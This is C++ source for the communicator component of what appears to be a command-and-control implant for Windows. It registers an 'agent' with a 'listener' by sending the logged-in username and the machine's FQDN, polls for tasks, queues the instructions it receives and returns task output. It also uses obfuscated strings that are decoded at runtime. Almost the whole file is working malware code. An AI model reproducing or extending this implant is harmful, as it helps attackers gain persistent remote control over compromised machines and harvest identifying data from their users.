#include <Windows.h>
#include "utils/winapi.h"
#include "communicators/base.h"
#include "utils/event.h"

/* Constructor */
BaseCommunicator::BaseCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pEventRegister, Event *pEventAgentShouldStop)
    : pWinApiCustom(pWinApiCustom),
      listenerHost(host),
      listenerPort(port),
      agentId(agentId),
      pCommunicateWithListenerData(NULL),
      communicateWithListenerDataSize(0),
      pTaskInputQueue(pTaskInputQueue),
      pTaskOutputQueue(pTaskOutputQueue),
      pEventRegister(pEventRegister),
      pEventAgentShouldStop(pEventAgentShouldStop) {}

/* Destructor */
BaseCommunicator::~BaseCommunicator() {}

/* Communicate with listener once; meant to be overriden by derived classes */
void BaseCommunicator::CommunicateOnceWithListener(BOOL forRegistration) {}

/* Starts communication with Listener; meant to be overriden by derived classes */
void BaseCommunicator::StartCommunication() {}

/* Queue data to register Agent with Listener */
void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
{
    static CHAR strAgentRegister[STRING_AGENT_REGISTER_LEN + 1] = ""; // "AGENT_REGISTER"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_REGISTER,
        STRING_AGENT_REGISTER_LEN,
        strAgentRegister);

    // Get logged-in username and hostname of computer
    LPVOID pUsername = this->pWinApiCustom->GetUserNameCustom();
    LPVOID pFqdnComputer = this->pWinApiCustom->GetFQDNComputer();
    if (pUsername == NULL || pFqdnComputer == NULL)
        goto CLEANUP;
    DWORD usernameLen = StrLen((PCHAR)pUsername);
    DWORD fqdnComputerLen = StrLen((PCHAR)pFqdnComputer);

    // Prepare registration data
    DWORD registrationDataSize = STRING_AGENT_REGISTER_LEN + 1 + 6 + 1 + fqdnComputerLen + 1 + usernameLen + 1; // "AGENT_REGISTER" + "-" + "6 char agent id" + "-" + "HOSTNAME" + "-" + "USERNAME" + "null-byte"
    LPVOID pRegistrationData = this->pWinApiCustom->HeapAllocCustom(registrationDataSize);
    if (pRegistrationData == NULL)
        return;

    CopyBuffer(pRegistrationData, strAgentRegister, STRING_AGENT_REGISTER_LEN);                                                     // "AGENT_REGISTER"
    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN, "-", 1);                                                       // "-"
    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1, this->agentId, 6);                                         // Agent Id
    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6, "-", 1);                                               // "-"
    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6 + 1, pFqdnComputer, fqdnComputerLen);                   // "HOSTNAME"
    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6 + 1 + fqdnComputerLen, "-", 1);                         // "-"
    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6 + 1 + fqdnComputerLen + 1, pUsername, usernameLen + 1); // "USERNAME" + null-terminating byte

    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        return;
    this->pTaskOutputQueue->Enqueue(pRegistrationData);
    this->pTaskOutputQueue->ReleaseThreadMutex();

CLEANUP:
    if (pUsername != NULL)
        this->pWinApiCustom->HeapFreeCustom(pUsername);

    if (pFqdnComputer != NULL)
        this->pWinApiCustom->HeapFreeCustom(pFqdnComputer);
}

/* Verify if Agent registration was successful */
BOOL BaseCommunicator::IsAgentRegistrationSuccessful()
{
    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        return FALSE;

    // Initialise buffer variables
    LPVOID pRegistrationResponseCorrect = NULL;
    PCHAR registrationResponseActual = NULL;

    BOOL result = FALSE;

    if (this->pTaskInputQueue->IsEmpty())
        goto CLEANUP;

    static CHAR strRegistered[STRING_REGISTERED_LEN + 1] = ""; // "REGISTERED"
    DeobfuscateUtf8String(
        (PCHAR)STRING_REGISTERED,
        STRING_REGISTERED_LEN,
        strRegistered);

    DWORD registrationResponseCorrectSize = STRING_REGISTERED_LEN + 1 + 6 + 1; // "REGISTERED" + "-" + "6 char agent id" + "null-byte"
    pRegistrationResponseCorrect = this->pWinApiCustom->HeapAllocCustom(registrationResponseCorrectSize);
    if (pRegistrationResponseCorrect == NULL)
        goto CLEANUP;

    CopyBuffer(pRegistrationResponseCorrect, strRegistered, STRING_REGISTERED_LEN);
    CopyBuffer((PBYTE)pRegistrationResponseCorrect + STRING_REGISTERED_LEN, "-", 1);
    CopyBuffer((PBYTE)pRegistrationResponseCorrect + STRING_REGISTERED_LEN + 1, this->agentId, 6 + 1); // Agent Id + Agent Id's null terminator

    for (int i = 0; i < this->pTaskInputQueue->GetSize(); i++)
    {
        registrationResponseActual = (PCHAR)(this->pTaskInputQueue->GetDataAtIndex(i, FALSE));
        result = CompareBuffer(pRegistrationResponseCorrect, registrationResponseActual, registrationResponseCorrectSize);
        if (result)
        {
            // Remove registration input from Listener because it's not a Task
            this->pTaskInputQueue->DequeueAt(i);

            // Set registration event
            this->pEventRegister->Set();

            break;
        }
    }

CLEANUP:
    if (pRegistrationResponseCorrect != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(pRegistrationResponseCorrect);
    }

    if (registrationResponseActual != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(registrationResponseActual);
    }

    this->pTaskOutputQueue->ReleaseThreadMutex();

    return result;
}

/*
Prepare data to send to Listener; this should be used before CommunicateWithListener()

This function does:
1. Frees and resets previous `pCommunicateWithListenerData` and `communicateWithListenerDataSize`
2. Sets up `pCommunicateWithListenerData` and `communicateWithListenerDataSize` with TaskOutputQueue data, and is ready to be sent to Listener by CommunicateOnceWithListener()
3. Clears TaskOutputQueue
*/
void BaseCommunicator::PrepareDataForCommunicateOnceWithListener(BOOL forRegistration)
{
    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        return;

    // Initialise buffer variable
    LPVOID pGetTasks = NULL;

    // Remove previous request data if exists
    if (this->pCommunicateWithListenerData != NULL)
    {
        if (this->pWinApiCustom->HeapFreeCustom(this->pCommunicateWithListenerData))
        {
            this->pCommunicateWithListenerData = NULL;
            this->communicateWithListenerDataSize = 0;
        }
        else
        {
            goto CLEANUP;
        }
    }

    // Calculate size of data to send

    //// Start with calculating size for new Task request
    static CHAR strGetTasks[STRING_GET_TASKS_LEN + 1] = ""; // "GET_TASKS"
    DeobfuscateUtf8String(
        (PCHAR)STRING_GET_TASKS,
        STRING_GET_TASKS_LEN,
        strGetTasks);

    DWORD getTasksLength = STRING_GET_TASKS_LEN + 1 + 6 + 1; // "GET_TASKS" + "-" + "6 char agent id" + "null-byte"
    pGetTasks = this->pWinApiCustom->HeapAllocCustom(getTasksLength);
    if (pGetTasks == NULL)
        goto CLEANUP;

    CopyBuffer(pGetTasks, strGetTasks, STRING_GET_TASKS_LEN);
    CopyBuffer((PBYTE)pGetTasks + STRING_GET_TASKS_LEN, "-", 1);
    CopyBuffer((PBYTE)pGetTasks + STRING_GET_TASKS_LEN + 1, this->agentId, 6 + 1); // Agent Id + Agent Id's null terminator

    if (!forRegistration)
        this->communicateWithListenerDataSize += StrLen((PCHAR)pGetTasks) + 1; // Len of string + 1 null-separator

    //// If there are Task outputs, include them in size calculation
    if (!this->pTaskOutputQueue->IsEmpty())
    {
        DWORD numOfTaskOutputs = this->pTaskOutputQueue->GetSize();
        for (int i = 0; i < numOfTaskOutputs; i++)
        {
            this->communicateWithListenerDataSize += StrLen((PCHAR)(this->pTaskOutputQueue->GetDataAtIndex(i, FALSE))) + 1; // Len of string + 1 null-separator
        }
    }

    // Prepare request data (raw)
    if (this->communicateWithListenerDataSize == 0)
        goto CLEANUP;

    this->pCommunicateWithListenerData = this->pWinApiCustom->HeapAllocCustom(this->communicateWithListenerDataSize);
    if (this->pCommunicateWithListenerData == NULL)
        goto CLEANUP;

    //// Start with new Task request
    DWORD bytesNumCopied = 0;
    if (!forRegistration)
    {
        bytesNumCopied += StrLen((PCHAR)pGetTasks) + 1;
        CopyBuffer(pCommunicateWithListenerData, pGetTasks, bytesNumCopied);
    }

    //// If there are Task outputs, append them
    if (!this->pTaskOutputQueue->IsEmpty())
    {
        DWORD numOfTaskOutputs = this->pTaskOutputQueue->GetSize();
        DWORD sizeOfTaskOutput = 0;

        for (int i = 0; i < numOfTaskOutputs; i++)
        {
            LPVOID taskOutputData = this->pTaskOutputQueue->Dequeue();

            sizeOfTaskOutput = StrLen((PCHAR)taskOutputData) + 1;
            CopyBuffer((PCHAR)pCommunicateWithListenerData + bytesNumCopied, taskOutputData, sizeOfTaskOutput);
            bytesNumCopied += sizeOfTaskOutput;

            this->pWinApiCustom->HeapFreeCustom(taskOutputData);
        }
    }

CLEANUP:
    this->pTaskOutputQueue->ReleaseThreadMutex();

    if (pGetTasks != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(pGetTasks);
    }
}

/*
Processes response from Listener; this should be used after CommunicateWithListener()

This function does:
1. Processes pResponseData to append to TaskInputQueue, by creating space (heap) for each Task and copying it to the space

This function does not:
1. Free up `pResponseData`; need to do it explicitly
*/
void BaseCommunicator::ProcessResponseFromCommunicateOnceWithListener(LPVOID pResponseData, DWORD responseDataSize)
{
    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        return;

    DWORD numOfNewTasks = NullSeparatedArrayNumOfStringElements((PCHAR)pResponseData);
    if (numOfNewTasks == 0)
        goto CLEANUP;

    LPVOID pTask = NULL;
    DWORD taskLen = 0;
    LPVOID pTaskInInputQueue = NULL;
    for (int i = 0; i < numOfNewTasks; i++)
    {
        pTask = NullSeparatedArrayStringAt((PCHAR)pResponseData, i);
        taskLen = StrLen((PCHAR)pTask);

        pTaskInInputQueue = this->pWinApiCustom->HeapAllocCustom(taskLen + 1); // Task + null terminator
        if (pTaskInInputQueue == NULL)
            continue;

        CopyBuffer(pTaskInInputQueue, pTask, taskLen);

        this->pTaskInputQueue->Enqueue(pTaskInInputQueue);
    }

CLEANUP:
    this->pTaskOutputQueue->ReleaseThreadMutex();
}